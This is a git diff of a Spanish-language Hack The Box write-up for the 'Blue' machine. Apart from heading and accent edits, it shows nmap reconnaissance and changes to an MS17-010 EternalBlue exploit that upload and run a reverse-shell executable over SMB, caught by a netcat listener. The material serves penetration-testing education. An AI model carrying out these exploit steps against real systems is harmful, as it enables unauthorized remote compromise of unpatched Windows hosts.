@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Blue - Hack The Box
-excerpt: "Una maquina relativamente facil, ya que usamos un exploit muy conocido que hace juego con el nombre de la maquina y que hay una historia algo curiosa, siendo que este exploit supuestamente fue robado a la NCA."
+excerpt: "Una máquina relativamente facil, ya que usamos un exploit muy conocido que hace juego con el nombre de la maquina y que hay una historia algo curiosa, siendo que este exploit supuestamente fue robado a la NCA."
 date: 2023-01-18
 classes: wide
 header:
@@ -15,14 +15,15 @@ tags:
   - Windows
   - SMB
   - Samba
-  - Remote Command Execution (RCE) - MS17-010
+  - SMB Remote Code Execution - MS17-010
   - Eternal Blue
   - Reverse Shell
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-blue/blue_logo.png)
-Una maquina relativamente facil, ya que usamos un exploit muy conocido que hace juego con el nombre de la maquina y que hay una historia algo curiosa, siendo que este exploit "supuestamente" fue robado a la NCA.
+Una máquina relativamente facil, ya que usamos un exploit muy conocido que hace juego con el nombre de la maquina y que hay una historia algo curiosa, siendo que este exploit "supuestamente" fue robado a la NCA.
 
+# Recopilación de Información
 ## Traza ICMP
 Como siempre, vamos a ver si la maquina esta conectada, lanzando un ping y a su vez, veremos que SO opera gracias al TTL.
 ```
@@ -73,19 +74,12 @@ Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
            Raw packets sent: 227709 (10.019MB) | Rcvd: 24244 (969.820KB)
 ```
 * -p-: Para indicarle un escaneo en ciertos puertos.
-
 * --open: Para indicar que aplique el escaneo en los puertos abiertos.
-
-* -sS: Para indicar un TCP SYN port Scan para que nos agilice el escaneo.
-
+* -sS: Para indicar un TCP SYN Port Scan para que nos agilice el escaneo.
 * --min-rate: Para indicar una cantidad de envio de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-
 * -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-
 * -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
-
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
 Vemos varios puertos abiertos, pero ya podemos deducir que la maquina usa el servicio SMB. Ahora vamos al escaneo de servicios.
@@ -132,11 +126,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 74.54 seconds
 ```
 * -sC: Para indicar un lanzamiento de scripts basicos de reconocimiento.
-
 * -sV: Para identificar los servicios/version que estan activos en los puertos que se analicen.
-
 * -p: Para indicar puertos especificos.
-
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
 Aqui vemos que se usa el servicio Samba(smb), es tiempo de buscar un exploit. Pero antes veamos un par de cositas que nos dice este escaneo.
@@ -166,6 +157,8 @@ Unable to connect with SMB1 -- no workgroup available
 
 ```
 Vemos la carpeta del Admin y usuarios, si bien podemos intentar entrar en usuarios, porque obviamente en Admin no podremos, vamos a buscar un exploit primero.
+
+# Analisis de Vulnerabilidades
 ## Buscando un Exploit
 Hagamos como siempre, usando la herramienta **searchsploit** para buscar un exploit adecuado de la maquina, como servicio usaremos: Windows 7 Professional 7601 Service Pack 1.
 ```
@@ -206,7 +199,7 @@ USERNAME = '' -> USERNAME = 'guest'
 smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py') -> smb_send_file(smbConn, '/Path_Donde_Esta_El_Reverse_Shell/eternal-blue.exe' 'C', '/eternal-blue.exe')
 service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') -> service_exec(conn, r'cmd /c c:\eternal-blue.exe')
 ```
-## Accediendo a la Maquina
+# Explotando Vulnerabilidades
 Una vez ya listo el exploit y siguiendo en el entorno virtual, vamos a activar una netcat que es ahi donde se conectara el exploit y luego activamos el exploit:
 ```
 nc -nvlp 443
